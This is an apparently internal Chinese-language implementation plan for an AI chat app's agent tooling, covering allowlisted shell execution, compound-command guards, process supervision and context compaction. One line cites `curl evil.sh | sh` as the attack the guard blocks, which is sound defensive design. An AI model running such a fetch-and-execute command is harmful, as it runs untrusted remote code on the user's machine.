# OmniChat Cowork 剩餘項目實作計畫

> **版本**：v1.7（2026-11-10）
> **v1.7 變更**（實作紀錄）：§2.9 P2-6 L3 工作區檔案地圖注入落地（✅）——組裝期 `file_list` 註冊時注入 token 預算內的 workspace 檔案清單；重用 `WorkspaceSnapshot.capture` 掃描、dot 段全遮蔽、穩定樹事實渲染（快取前綴契約）、三段預算降級；§0.4 表同步。
> **v1.6 變更**（實作紀錄）：§2.11 P3-1 瀏覽器 QA 落地（✅）——STDIO 傳輸 UI＋Playwright 一鍵預設（桌面限定）、STDIO 連線錯誤分類、MCP 圖片落盤＋工具卡預覽；§0.4 表與 §1 Wave D 同步。
> **v1.5 變更**（實作紀錄）：§2.17 記錄 `file_grep`（regex 內容搜尋，✅）與 `file_view_image` Stage 1（🔶，工作區圖片檢視＋工具卡預覽；Stage 2 vision plumbing 待做）的落地細節——代碼、測試與紀錄隨 commit `11adb10a` 提交；§0.5 view_image 落點補記實作狀態。
> **v1.4 變更**（裁示移除）：P2-1 啟動恢復橫幅與 §2.12 P3-3「進行中任務」頁（UI 面）依 2026-11-09 實測裁示全數移除——恢復收斂為**對話內就地式**（pending 卡／部分訊息即動作點）；P2-1 checkpoint 寫入地基（durable-before-dispatch、fence、審批暫停語意）保留為隱形正確性保險，讀取面為 P2-2 預留。詳見 §0.2、§2.4、§2.12。
> **v1.3 變更**（自給自足化）：**吸收原《CLI 工具整合計畫 v4》**（2026-08-05 設計；原文同日封存於 `D:\Softwares\Omnichat\Archive\OmniChat CLI 工具整合計畫 — Windows + Android (proot) v4.md`，僅作考古依據）——① §2.8 P2-5 內化原 §七（Android PRoot backend 藍圖全文）＋§十五（F-Droid 發行要求），並補 ADR-A8 衝突消解／timeout 併批／backup 歸屬三項整合註記；② §0.4 藍圖欄、§2.2 與 §6 的 CLI v4 引用全部改訂為「已內化／歷史歸屬」——P1-6 原引用的執行契約（§五/§六）與測試矩陣（§十三）早已逐一列於 §2.2，內容未動。**本計畫的藍圖內容自本版起自給自足，不需回查其他計畫文件**；③ 參考表校正——§6 AnyBuff 路徑修正為本機實際位置 `C:\Users\w2bn1\GitHub\Anybuff`（原誤記 `Documents\GitHub\AnyBuff`），並為 P2-5 新增**第二對照組**：AnyBuff `android/` engine（已上線 v1.7.1 的 proot-Node 沙盒，ADR-21）隨 §2.8 補記對照細節；④ P2-5 藍圖以 kelivo 上游行為（master @ `51777f7`）增補**五項對照裁定**——per-request mounts vs generation 快照取捨（維持快照，入 kelivo 對照段）、path resolver **逃逸拒絕**入條目 7、`env -i` 最小 guest 環境入條目 3、32-bit `--kernel-release` 備註入條目 4、**RO 執行層在 app（proot `-b` 不強制 RO）**入條目 7。
> **v1.2 變更**（review 修正）：① 事實修正——`preview_diff` 係基於**請求參數**而非最終匹配結果（§2.16）、kelivo 行數改「核心服務層約 12,500 行（UI 另計）」、§2.15 共用 diff 來源矛盾消解（viewer 用 Myers；審批卡換芯列可選）；② 設計補強——`output_file` 讀取**裁定**為「唯讀 session-outputs zone ＋ retention」（§2.2 增量 4）、`FileSnapshot` 改 `(mtime, size)` 二元組並註明近似審計、`block_anchor` 中段盲區與整窗替換語意入 §2.16、ToolRun 補 reload／跨頁面語意、P1-6 補 `timeout_seconds`／`cwd` 工具參數；③ 新增 `view_image` 可選項（§2.17）；④ 表格排序與計數措辭校正。
> **v1.1 變更**：吸收 kelivo workspace 調查（`chevey339/kelivo` @ `51777f7`；workspace 為上游 v1.3.0／2026-09-22 引入，**晚於原計畫調查基準 `7125a25`**）——**接受全部導入建議**：新增 §2.16 P1-8（file_edit 三段式容忍匹配，即刻可做）；§2.2 P1-6 併入五項導入增量＋一項可選（環境旗標／FileSnapshot changed_files／結構化 payload／輸出外部化至 app 私有 session dir／ToolRun 即時串流；可選桌面 companion）；§2.15 升級為 Myers unified diff；§2.4 P2-1 補 ConversationToolPermissions 工程參考；§2.8 P2-5 補 kelivo `sandbox/` 對照實作；§2.17 可選週邊；§6 參考表新增 workspace 對照。未採納的設計分歧記錄於 §0.5。
> **來源**：`IMPORT_PLAN_COWORK_20260911.md`（v1.9，2026-09-11）Phase 1–3 未竟項目整理，項目編號沿用原計畫
> **性質**：跨多版本的路線圖＋實作計畫。**各項開工前應再出該項的細部執行計畫**（比照 `IMPORT_PLAN_CROSS_TURN_TOOL_RESULTS.md` 粒度：逐檔案、逐測試）。
> **狀態標記**：⬜ 未動工 ｜ 🟡 部分完成（有尾款）｜ ✅ 完成 ｜ ⛔ 結案移除

---

## 0. 範圍與裁示紀錄

### 0.1 已完成（不在本計畫）

- **Phase 0 全部**（P0-1 kernel、P0-2 driver、P0-4 reasoning echo、P0-5 maxSteps/軟預算——僅 P0-3 有尾款）
- **Phase 1 MVP**：P1-1 審批五態、P1-2 自動壓縮（R0/L0/L1＋mid-run 重評估）、P1-3 TODO + ask_user、P1-4 工具輸出上限（`tool_result_caps`）、P1-7 Phase 1 測試
- **P3-2 技能庫本體**：已由 v1.25.0 落地（手冊 §3.15——技能庫、`/skill` 指令、GitHub 下載、管理 UI）

### 0.2 已回撤／移除（勿重新提案）

| 項目 | 狀態 |
|:--|:--|
| P1-4 長輸出外部化 | 2026-09-12 回撤，改為純記憶體上限 `tool_result_caps`（工作區零殘留裁示） |
| P1-5 工作區快照回滾 | 2026-09-10 完全移除（復原交使用者自己的 git） |
| MCP 工具審批 | 2026-09-10（v1.6）移除——MCP 免審直接執行 |
| P2-1 啟動恢復橫幅＋P3-3「進行中任務」頁 | 2026-11-09 裁示移除（UI 面）——橫幅屬推播式恢復、實測打擾；任務頁屬拉取式、無使用。恢復收斂為對話內就地式（pending 卡／部分訊息即動作點）；P2-1 寫入地基保留；見 §2.4／§2.12 |

### 0.3 本版裁示不採（2026-11-06，自計畫移除）

1. **P2-6 L2 LLM 摘要**——v1.4 評估已結案「不採」（失敗路徑三難／ADR-A6 零儲存失效／手機延遲與程序回收風險／BYOK 成本），本版確認維持既有分工：**手動「壓縮上下文」鈕＝LLM、自動壓縮＝機械**。P2-6 僅保留 **L3 工作區檔案地圖**（見 §2.9）。
2. **P3-2 computedHash / skills-lock**（RikkaHub `skills-lock.json` 模式的來源 URL + 內容雜湊鎖定）——不採。
3. **P3-2 per-assistant skill 勾選欄位**（Assistant 模型加技能勾選、組裝期過濾注入）——不採。

→ **P3-2 全項結案移除**：技能庫本體已落地，剩餘工作只有上述兩個細節，皆不採，故無剩餘事項。

### 0.4 剩餘項目總表（14 項＋2 筆尾款）

| # | 項目 | 藍圖 | 狀態 | 建議版本 |
|:--|:--|:--|:--:|:--|
| P0-3(尾) | legacy 傳輸層工具迴圈移除（+ Neuralwatt parity 可選） | kelivo providers 分層 | ✅（2026-11-06：四條 transport 迴圈全刪、`onToolCall`／`exposeToolCallsOnly` 退場、kill-switch 移除；見 `docs/P0-3_legacy_tool_loop_removal_plan.md`） | v1.29.x |
| P1-2(尾) | `cache_expiry` 觸發（30 分鐘閒置壓縮） | AnyBuff 觸發器 | ✅（2026-11-06：以最後成功 usage 為活動錨點；見 §2.3） | v1.30.x |
| P1-6 | 桌面開發者模式 + Allowlist Shell（`shell_run`）**＋ kelivo 導入增量** | ADR-A8/A9 + 執行契約已內化於 §2.2（原 CLI v4 §五/§六）+ kelivo workspace | ✅（2026-11-06；見 §2.2 落地紀錄） | v1.29.x |
| P1-8 | file_edit 三段式容忍匹配（kelivo 導入，**即刻可做**） | kelivo `edit_matchers.dart`（RikkaHub TextReplacers 移植） | ✅ | v1.29.x |
| P2-1 | Checkpoint 持久化（durable-before-dispatch） | deepseek-harness | ✅（2026-11-07：`agent_runs_v1`；2026-11-09 啟動橫幅隨 P3-3 一併移除；見 §2.4） | v1.30.x |
| P2-2 | 背景長任務（桌面托盤 + Android 前景服務） | 既有基建 + P2-1 | ⬜ | v1.31.x |
| P2-3 | 子代理（`spawn_subagent`） | AnyBuff agents/ + AiTeamController | ⬜ | v1.31.x |
| P2-4 | Mini dev server + Live 預覽 | 既有 `html_preview_*` + 新 dev server | ✅（2026-11-08：loopback 靜態伺服器、SSE 重整、`get_console_errors`、分頁面板；見 §2.7） | v1.31.x |
| P2-5 | Proot on Android（**stretch**；kelivo `sandbox/`＋AnyBuff `android/` engine 為對照實作） | 藍圖已內化於 §2.8（原 CLI v4 §七/§十五）+ kelivo v1.3.0+ | ⬜ | 視需求 |
| P2-6(L3) | 工作區檔案地圖注入（**僅 L3**；L2 LLM 摘要不採） | AnyBuff `truncate-file-tree` 概念 | ✅（2026-11-10：組裝期注入、`WorkspaceSnapshot` 掃描重用、預算三段降級、快取前綴契約；見 §2.9） | v1.32.x |
| P2-7 | kelivo 資料模型對齊（**可選**） | kelivo `a43b79f` | ⬜ | 視需求 |
| P3-1 | 瀏覽器 QA 工具（Playwright via MCP，桌面限定） | MCP + Playwright | ✅（2026-11-10：STDIO 傳輸 UI＋Playwright 一鍵預設、連線錯誤分類、MCP 圖片落盤＋工具卡預覽；見 §2.11） | v1.32.x |
| ~~P3-3~~ | ~~跨會話任務恢復（「進行中任務」頁）~~ **已移除**（2026-11-09 裁示；見 §2.12） | P2-1 延伸 | ⛔ 已移除 | — |
| P3-4 | 上限再校準 + 磁碟預算（dev mode 寫入 2MB 級） | — | ✅（2026-11-08：dev mode 2MB、Tools 頁磁碟用量、`file_read` 24KB 預設窗口；見 §2.13） | v1.32.x |
| ~~P3-5~~ | ~~Plan Mode（先規劃 → 人批 → 再執行）~~ **不實作**（見 §2.14 裁示） | deepseek plan-mode | ❌ 已移除 | — |
| P1-1(尾) | 執行後全檔 diff viewer（原計畫歸 Phase 3；Myers unified diff） | RikkaHub `diffOf` + kelivo `unified_diff` | ✅（2026-11-08：Myers unified diff、卡片 ±N、展開全檔變更；見 §2.15） | v1.29.x |

### 0.5 kelivo workspace 導入裁示（2026-11-06）

> **調查基準**：`chevey339/kelivo` master @ `51777f7`（2026-11-05，本地克隆 `/tmp/kelivo-ws-survey`）。workspace 為上游 **v1.3.0（2026-09-22）** 引入的旗艦功能——8 工具（`shell`/`read_file`/`view_image`/`write_file`/`edit_file`/`list_dir`/`glob`/`grep`）+ Android PRoot／iOS iSH 沙盒 + 桌面原生 shell + 行動內建終端機 + 檔案瀏覽器（**核心服務層**約 12,500 行，UI 另計）。**原 Cowork 計畫未曾評估此子系統**（調查基準早於其推出）。本版**接受全部導入建議**，落點如下；未採納的設計分歧記錄於本節末。

**採納（導入落點）**：

| # | kelivo 來源 | 內容 | 落點 |
|:--|:--|:--|:--|
| A | `edit_matchers.dart`（~276 行） | file_edit 三段式容忍匹配：`exact → line_trimmed → block_anchor`＋ambiguous 策略標示 | **§2.16 新項 P1-8**（即刻可做，介面不動） |
| B | `unified_diff.dart`（~215 行） | Myers diff（`diffutil_dart`）＋hunks＋±N 計數＋64KB 截斷 | **§2.15** diff viewer／審批卡換芯 |
| C | `tool_run_registry.dart` + `shell_output_buffer.dart` | 工具**即時串流輸出**：50ms 節流、ANSI CSI 進度行替換、UTF-8 chunk-safe、bounded tail（200 行/32KB）、LRU（200 條/8MB） | **§2.2 P1-6 增量 5** |
| D | `workspace_tools_service.dart` shell 段 + `conversation_files.dart` + `output_buffer.dart` | 五個 agent 友善環境旗標、`FileSnapshot`（`(mtime, size)`）→ `changed_files`、結構化 payload、輸出外部化（合計 >32KB、preview 各 4KB）——**裁定：唯讀 session-outputs zone ＋ retention 20 檔/7 天**（見 §2.2 增量 4） | **§2.2 P1-6 增量 1–4** |
| E | `sandbox/` 全目錄 | PRoot/iSH 沙盒對照實作（channel/PTY、installer 狀態機、鏡像測速） | **§2.8 P2-5** 對照參考 |
| — | `ConversationToolPermissions` | 授權屬對話、序列化寫入、revision fencing、`context_changed` 防護 | **§2.4 P2-1** 工程參考 |
| — | `file_link_resolver.dart` / `workspace_session_sync.dart` / 行動 terminal | 可選週邊 | **§2.17** |
| — | `view_image`（v1.3.1） | 工作區圖片檢視＋聊天內嵌預覽（OmniChat 現無此能力） | **§2.17** 可選 → 🔶 Stage 1 已實作（2026-11-09，命名 `file_view_image`；grep 缺口同批以 `file_grep` 補齊） |

**未採納（設計分歧，記錄在案）**：

| kelivo 做法 | OmniChat 現案 | 裁定 |
|:--|:--|:--|
| 桌面 shell 一律審批（無 allowlist 概念） | ADR-A9 allowlist 免審 + 複合守衛 + ask | 維持現案 |
| 對話級 `fullAccess` 一鍵跳過審批 | strict mode + always-allow override（per-command/path） | 不跟進（風險敘事不利商店合規）；其持久化工程已列 P2-1 參考 |
| managed/linked 多工作區 + 外部掛載（10 個 RO/RW 持久授權） | assistant-bound WorkspaceConfig + 出界逐次 ask | 不跟進（架構分岔過大） |
| 桌面環境完整繼承 `Platform.environment`（無 allowlist） | CLI v4：`includeParentEnvironment: false` + allowlist + secret 遮蔽 | 維持現案（更安全） |
| `.app.html` 隔離離線 web app | P2-4 dev server（服務整個 workspace） | 路線不同；若 P2-4 未來做離線互動小工具再回看 |

> **授權註記**：kelivo 為 AGPL-3.0，OmniChat 本為其 fork、同譜系 import 慣例已存在（如 v1.3.2–v1.3.4 reasoning/OAuth 修復）；`sandbox/` 等 native/channel 層仍照原計畫附A 慣例**抄設計與語意、不抄代碼**。

---

## 1. 建議實施順序與依賴圖

```
【Wave A：獨立還債與即刻小項，隨時可做】
  P0-3 尾款（kill-switch soak 滿一版即動；零新功能、消除 C2 餘毒與雙軌稅）
  P1-8 file_edit 三段匹配（kelivo 導入；獨立小項、介面不動、即刻可做）

【Wave B：Phase 1 收尾】
  P1-6 開發者模式 + shell（審批引擎 P1-1 已備妥擴充點）
    ├──→ P3-4 上限再校準（dev mode 落地後才有意義）
    └──→ P3-1 瀏覽器 QA（外部程序治理基建共用；非硬依賴，可提前）

【Wave C：「可恢復」地基】
  P2-1 Checkpoint
    ├──→ P2-2 背景長任務（背景續跑沒有 durable-before-dispatch 不安全）
    └──→ P3-3 跨會話任務恢復（⛔ 2026-11-09 裁示移除——恢復改為對話內就地式）

【Wave D：「製作網站」閉環】
  P2-4 Dev server + Live 預覽（✅ 2026-11-08）──→ P3-1 瀏覽器 QA（✅ 2026-11-10；要有持續開著的頁面才有得驗證）

【Wave E：上下文治理補強（互相獨立，可穿插）】
  P1-2 尾款 cache_expiry（✅）｜ P2-6 L3 檔案地圖

【Wave F：擴充與拋光】
  P2-3 子代理 ｜ P1-1 尾款 diff viewer（✅）

【Stretch / 可選】
  P2-5 Proot（stretch） ｜ P2-7 kelivo 對齊（可選）
```

**一句話**：先做 **P0-3 尾款**（最便宜、消除持續風險）、**P1-8**（獨立小項、即刻可做）與 **P1-6 + P2-1**（其餘多項的地基）；「製作網站」閉環走 **P2-4 → P3-1**；P3-4 等 P1-6 落地後收尾。

---

## 2. 各項詳細計畫

### 2.1 P0-3(尾) legacy 傳輸層工具迴圈移除（+ Neuralwatt parity 可選）✅【2026-11-06 完成】

**目標**：`chat_api_service.dart` strangler 手術收尾——刪除四條內嵌 `while(true)` 工具迴圈（OpenAI stream／Claude／Google／Responses），傳輸層收斂到 kernel path（`AgentOrchestrator` + `agent_loop.dart`）。

**現況（已完成）**：`chat_api_service.dart` 只剩 1 處 `while (true)`（L1 retry），`onToolCall`／`exposeToolCallsOnly` 零殘留，檔案由 10,697 行降至 8,009 行。落地紀錄（含三個機械轉換陷阱）見 `docs/P0-3_legacy_tool_loop_removal_plan.md` §執行進度。

**為何必要**：
- **C2 bug 最後餘毒**——legacy 迴圈以「整條工具鏈」為重試單位，鏈中段 5xx/靜默中斷會從頭重跑所有工具副作用（`file_append` 重複寫、搜尋重複計費）。kernel 已根治，但關閉 kill-switch 的使用者仍暴露。
- **雙軌維護稅**——雙軌期內不得對舊迴圈加新功能，每次傳輸層改動要兩條路徑重複驗證 parity。
- **C1 真正了結**——不移除舊迴圈，「~9,000 行、工具迴圈寄生傳輸層」只解決一半。

**實作內容**：
1. 確認 `agent_loop_v1` soak 滿一個版本無回歸（手冊 §7.2 既有決策）。
2. 逐條移除四條 legacy 迴圈——**保留**各家串流解析、§3.10 L1 retry／靜默中斷偵測、P0-4 reasoning echo（`assistantExtras`）——這些是純傳輸職責，不隨迴圈刪除。
3. Neuralwatt transport 轉上 kernel（標記可選——優先級取決於該 provider 實際使用量；不移除前該路徑的舊迴圈不能刪）。
4. 清理 legacy-only 測試與 `exposeToolCallsOnly` 殘留；移除 kill-switch（或保留一版再刪）。

**測試**：`chat_turn_service_test`、`deepseek_claude_compat_test`、`replay_tool_results_api_test`、`claude_prompt_caching_test`、OAuth 訂閱路徑（§3.19）回歸；副作用重放回歸（第 2 輪 503 → `file_append` 只執行一次）。

**風險**：OAuth 訂閱路徑（ChatGPT/Claude/Grok/Kimi Code）在 kernel 的行為差異——出細部計畫時逐一盤點該檔的 provider 分支。

---

### 2.2 P1-6 桌面開發者模式 + Allowlist Shell（`shell_run`）✅【2026-11-06 完成】

> **藍圖**：原《CLI 工具整合計畫 v4》§三~§六、§八——執行工程契約**已逐項內化於下文**（原文已封存，不需回查）；其 blocking 確認框不採（ADR-A9）。命名維持 `shell_run`。
> **Phase 1 最後一項功能（2026-11-06 落地）**；手冊 §7.2 官方待辦第一條。
>
> **落地紀錄（2026-11-06）**：新增 `lib/core/services/shell/`——`shell_policy.dart`（allow/ask/deny、複合命令逐段、`programsIn` 正規化）、`cli_process_supervisor.dart`（只用 `Process.start()`、collectors 先於 wait、超 cap 持續 drain、timeout/cancel 以 Job Object 終止整棵樹、`taskkill /T` fallback、UTF-8 `allowMalformed`）、`windows_job_object.dart`（純 `dart:ffi`，未新增 `win32`/`ffi` 直接相依）、`changed_files.dart`（`(mtime,size)` 前後快照、cap 20k/50）、`tool_run_registry.dart`（50ms 節流、ANSI/`\r`、200 行/32KB、LRU 200/8MB）、`shell_run_service.dart`（dev mode/PATH readiness、cwd/timeout、env allowlist＋五旗標、secret 遮蔽、結構化 payload、>32KB 外部化）。輸出落 `{appSupport}/tool_outputs/{conversationId}/{toolCallId}.txt`；`session_outputs.dart` 提供 sweep（20 檔/7 天）與刪除清理，`FileToolService` 新增唯讀 zone（僅 `file_read`/`file_search`，寫入一律拒）。設定新增 `developer_mode_v1`／`shell_allowlist_v1`（皆同步，見 §5.7）；strict 沿用既有 `approval_strict_mode_v1`，不新增重複開關。UI：設定→Developer mode（總閘、allowlist、PATH probe）、Workspace Tools 條件列、審批卡完整命令/blocked programs、工具卡 `ShellLiveTail`；l10n 四語系。測試新增 `shell_policy_test`／`session_outputs_test`／`tool_output_read_test`／`cli_process_supervisor_test`／`shell_run_service_test`；2026-11-06 review 修正再加入 `changed_files_test`，相關 10 檔 142 案全綠。`flutter analyze --no-pub` 0 errors（既有 warnings/info 不計）。
> **與計畫的差異**：stdout/stderr 捕獲上限由 24KB/6KB 提高為 1MB/256KB——原上限合計 30KB，使 >32KB 外部化分支永遠不可達；模型端仍由 `ToolResultCaps` 限 32,768 字元（手冊 §5.1 第 7 點）。

**目標**：桌面（Windows）提供受控的命令執行工具 `shell_run`，以「開發者模式」總閘 + 三層命令政策實現可監督的 shell 能力；Android 不提供。

**三層開關（每層獨立、疊加生效）**：

| 層級 | 機制 | 預設 |
|:--|:--|:--|
| 總開關 | `developer_mode_v1`（**桌面限定**，dev-mode 關閉時工具不注入、呼叫被拒） | **關** |
| 個別開關 | 既有 `workspace_tools_disabled_v1` per-tool toggle（掛進清單後自動出現在 Tools 頁） | 開 |
| 命令級政策 | allow/ask/deny 三層（ADR-A9，v1.5 改寫） | allowlist 預設 `git, node, npm, npx, python, pip, pandoc, ffmpeg` |

**命令級政策細節**：
- allowlist 內（含複合守衛通過）→ 直跑；**allowlist 外 → ask**（Pending 卡顯示完整命令，使用者「本次允許 / 永遠允許（寫回 allowlist）/ 拒絕」；拒絕回結構化 error JSON，模型可調整方向）。
- **複合命令守衛**：命令含 `&&`、單一 `&`、`;`、`|`、`$()`、backtick 時，**每一段**首 token 都必須在 allowlist 才免審，否則整條落 ask——關閉 `git status & curl evil.sh | sh` 型攻擊面；`2>&1`／`<&0` 的 redirection ampersand 不切成新命令。
- strict 模式 toggle（偏好硬擋者）可把 ask 全降為 deny。

**工具參數（kelivo 對照補齊）**：`command`（必填）；`cwd`（選填，限 workspace 內、canonical symlink 後仍須在 workspace，預設 workspace 根）；`timeout_seconds`（選填，預設 900、clamp 1–3600——與 process tree kill 共用同一 timeout 來源，不另設第二個計時器）。

**Process 執行契約（原 CLI v4 §五/§六，逐項採納——已內化於下）**：
- 一律 `Process.start()`，**禁止 `Process.run().timeout()`**——pipes 未讀 → 大輸出 pipe deadlock；Future timeout 不殺子程序。
- process 啟動後**立即**建立 stdout/stderr collectors 並持續 drain；超過 cap 後仍讀取並丟棄（防 pipe deadlock）、設 `truncated=true`。
- timeout / cancel / app 結束必須**終止整個 process tree**：Windows Job Object（純 Dart FFI，`win32`+`ffi` 直接相依；`JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE` + `AssignProcessToJobObject` + `TerminateJobObject`），`taskkill /T` 僅作 fallback——`Process.kill()` 對 `cmd.exe` 子樹無效。
- `CliProcessSupervisor` 統一生命週期：`start / awaitResult / cancel / collectOutput / cleanup`（形狀對齊 kernel 可測性哲學）。
- foreground 併發：每 generation 1 個（FIFO，沿用 `_withFetchQueue()` 慣例）；§5.1 教義延伸——外部程序一律串行、輸出截斷、never-parallel 守衛。

**Windows 編碼與引導模板**：cmd 前綴 `chcp 65001 >nul &` + `cmd.exe /d /s /c`；PowerShell 前綴 `[Console]::OutputEncoding=UTF8` + `-NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass`；Dart 端 UTF-8 `allowMalformed: true` 解碼。zh-TW 系統 console 預設 cp950——不做此事 agent 會讀到亂碼並可能誤判重試循環。

**環境與 secret 政策**：`includeParentEnvironment: false` + allowlist（`SystemRoot`/`ComSpec`/`TEMP`/`PATH` 等必要項）；stdout/stderr 可能含秘密 → tool event cap + 敏感值遮蔽；log 不保存完整 command 與完整輸出。

**輸出預算（本計畫修正）**：原計畫寫「接 P1-4 長輸出外部化」，P1-4 已回撤——**改接 `tool_result_caps`**（序列化總長 ≤32,768 字元 + 依工具家族的重新查詢指引）；24KB stdout / 6KB stderr cap 為 handler 層前置。

**Readiness 四態（原 CLI v4 §三.2）**：`disabled / installing / ready / broken` + availability 閘（function calling ∧ workspace ∧ shell enabled ∧ **allowlist 成員實際存在於 PATH 的 probe**）；UI 顯示狀態與可理解錯誤。

**ShellConfig 快照**：generation 準備時一次捕獲（cwd、dialect、allowlist、審批政策）；generation 進行中 UI 變更不修改已建立 handler（與 File Tools 同一份 snapshot）。

**政策分級（ADR-A8）**：開發者模式內允許在工作區建 `.sh/.ps1` 等腳本檔（黑名單例外僅桌面+opt-in），執行時把直譯器加入 allowlist 即可執行；**Android 維持全黑名單、不提供 `shell_run`**。

**審批整合（底座已備）**：P1-1 審批引擎 `decodeApprovalOverrideKey` 刻意設計為「未知 key 形狀回 null」——新增 shell 政策源不破壞既有清單；「永遠允許」寫回 allowlist 儲存；Pending 逾時／resume／AI Team slot 繼承快照全沿用既有機制。

**實作檔案（建議）**：`lib/core/services/shell/`（新：`cli_process_supervisor.dart`、`shell_policy.dart`、`shell_run_service.dart`）；`settings_provider.dart`（`developer_mode_v1`、allowlist、strict mode）；`tool_handler_service.dart`（definition 條件式註冊——**必須自查 developer mode**，比照 memory 看 `enableMemory`、skill 看 `skillsPreloadEnabled` 的既有條件式模式；handler 分支；`_classifyApproval` shell 源）；`approval.dart`（shell 政策源 + override key 解碼）；Workspace Tools 頁自動跟隨；桌面設定 UI（dev mode 總閘 + allowlist 編輯）。

**kelivo 導入增量（2026-11-06 調查，§0.5）**——CLI v4 執行契約之上的六項補強：

1. **Agent 友善環境旗標**（可先行建置）：在 env 組裝處固定加入 `NO_COLOR=1`、`CI=true`、`PAGER=cat`、`TERM=dumb`、`LANG=C.UTF-8`——防彩色碼／互動 pager 汙染輸出（與環境 allowlist、secret 遮蔽並存；kelivo 桌面 shell 實測同款）。
2. **`FileSnapshot` changed_files**（基建可先行，~90 行）：shell 執行前後對 workspace 根做 **`(mtime, size)` 二元組**快照（純記憶體、cap 20k 條、跳點目錄）→ 結果帶 `changed_files`（cap 50 + `changed_files_truncated`）——**告訴模型與使用者這條命令改了哪些檔案**（審計＋模型自省；快照不落盤，零殘留不變）。**已知限制（照實寫）**：仍屬**近似審計**——同 mtime tick 且同 size 的修改、或刻意保留 mtime 的工具（`touch -r` 等）會漏報；兩次全樹 walk 在 20k 條上限內，成本與 `file_search` 同級可接受。
3. **結構化 shell payload**：`exit_code / duration_ms / timed_out / cancelled / interrupted / truncated` 隨結果 JSON 回傳——模型可據此自判重試策略。
4. **輸出外部化（app 私有）＋唯讀 session-outputs zone（本版裁定）**：kelivo 規格——stdout+stderr **合計 >32KB** 才觸發、preview 各 4KB、檔名 `outputs/<toolCallId>.txt`（無內建 retention）。OmniChat 落點＝ `{appSupport}/tool_outputs/{conversationId}/{toolCallId}.txt`（**app 資料目錄，非工作區**——工作區零殘留不變），payload 帶 `output_file` 模型路徑。
   - **讀取路徑裁定（阻斷點）**：**① 新增唯讀 session-outputs zone（採用）**——`FileToolService` 路徑解析層加明確 root 的唯讀區，僅 `file_read`/`file_search` 可進、寫入一律拒；② 專用工具 `read_tool_output`（不採：介面冗餘）；③ 放棄外部化回純記憶體上限（不採：長 build log 取回價值高）。
   - **retention（必做）**：每對話最多 20 檔／7 天（比照已回撤 P1-4 的 sweep 參數）、訊息/對話刪除時同步清理；sweep 於寫入時機會式執行。`outputs` 不進 `changed_files`（它在工作區外——正確行為，非漏報）。
   - **預算契約照手冊 §3.14 §5 F1 教訓**：payload 加料（preview＋output_file＋指引）必須從自身 32,768 預算扣除。
5. **ToolRun 即時串流**（UI 增強）：執行中工具卡顯示即時輸出——50ms 節流 notify、ANSI CSI 解析（`\r` 進度行替換，npm/ffmpeg 進度條不洗屏）、UTF-8 chunk-safe 解碼、bounded tail（200 行/32KB）、LRU 驅逐（200 條/8MB）、`finishHandoff` 防模型未交接即被驅逐；與 `CliProcessSupervisor` 的 collectors drain 接線（drain 位元組餵給 ToolRun）。**整合語意（明確定義）**：registry key＝`(conversationId, toolCallId)`（P1-4 id-aware 契約已貫通，kernel/legacy 皆帶 provider call id）；工具卡以 `ChangeNotifier` 訂閱**疊加**在已持久化 tool event 之上；**reload／跨頁面僅剩終態**（registry 為 process-lifetime，重啟後由 tool event 顯示最終輸出，無即時 tail）——測試需覆蓋此行為。
6. **（可選）桌面 companion**：`revealInFileManager` / `openInSystemTerminal`（在檔案總管顯示／開系統終端機）；行動 in-app terminal 見 §2.17（依賴 P2-5 的沙盒 PTY）。

**文件**：手冊 §5.1 新增「外部程序治理」子節、§3.1 措辭更新（「預設沙盒；沙盒外寫入需逐次明示核准」）。

**測試（重點矩陣）**：三層政策（allowlist 內含複合守衛通過直跑；外 → ask 不再即時拒絕；strict 降級）、複合命令守衛（`&&`/單一 `&`/`;`/`|` 切分後每段首 token 皆須在清單；`2>&1` 不切分）、「永遠允許」寫回 allowlist、dev-mode 關閉時工具不注入/呼叫被拒；process 契約——collectors 先於 wait 建立、超 cap 持續 drain、timeout 終止整個 process tree（Job Object）、cancellation 不被吞且子程序與 collectors 皆回收、parent environment 不完整繼承、tool exception 不中斷 stream（error JSON 透傳）、cwd 限縮 workspace 內（含 symlink 逃逸拒絕）、CJK/cp950 編碼、foreground FIFO 排隊、secret 遮蔽；AI Team slot 繼承 shell tools（deny/非成員回傳 result 不中斷流程）。**kelivo 導入增量**：50ms 節流與 tail/LRU 上限、ANSI 進度行替換（`\r`）、changed_files 快照（新增/修改、同 mtime 不同 size 可偵測、cap 20k 截斷且截斷時不誤報刪除）、`output_file` 外部化 round-trip（>32KB 觸發、preview 4KB、唯讀 zone 讀取、寫入被拒、retention 20 檔/7 天、對話刪除與 clearAll／restore 清理）、shell payload 總長 ≤32,768（F1 教訓）、`timeout_seconds` clamp（1–3600、預設 900）與 `cwd` 越界拒絕、ToolRun reload 後僅終態。

---

### 2.3 P1-2(尾) `cache_expiry` 觸發 ✅【2026-11-06 完成】

**目標**：30 分鐘閒置後的機會式壓縮觸發——閒置超過門檻時 prompt cache 已冷，此時壓縮不再付出「cache 前綴失效」的代價，可提前把 context 壓回健康區。

**落地紀錄（2026-11-06）**：`compaction_trigger.dart` 新增 `cacheExpiryIdleThreshold`（30 分鐘）與 `latestSuccessfulRequestAt()`；generation prep 將最後一個 **具 `promptTokens` 且已完成**的 assistant 訊息時間傳入 trigger，作為成功請求錨點。`evaluateCompactionTrigger` 現在是「token 門檻 OR cache-expiry」：閒置達標時跳過 `trigger(W)` 門檻，但仍先過 140k floor，後續切點／tail／version-group 防護完全沿用。未修改 conversation/SQLite schema：`promptTokens` 已是既有持久化訊號；沒有 usage 的重試／失敗訊息不會推進錨點，live placeholder（`isStreaming`）也排除。新增 `test/compaction/cache_expiry_test.dart`（29m59s／30m01s 邊界、floor、正常公式、未來時鐘、成功錨點選擇）。

**與原計畫的差異**：原計畫建議把活動時間掛在 conversation metadata；實作改為從既有訊息 usage 推導最後成功請求時間，避免為單一 cache 優化 bump SQLite schema／安裝閘門版本。代價是時間錨點精度為「請求訊息時間（有 `processFinishedAt` 時優先）」，不是每次 API 成功回應的精確毫秒。

**測試**：閒置邊界（29min59s 不觸發 / 30min01s 觸發）、floor 尊重、與 trigger 公式並存的優先序、活動時間以成功請求為準。

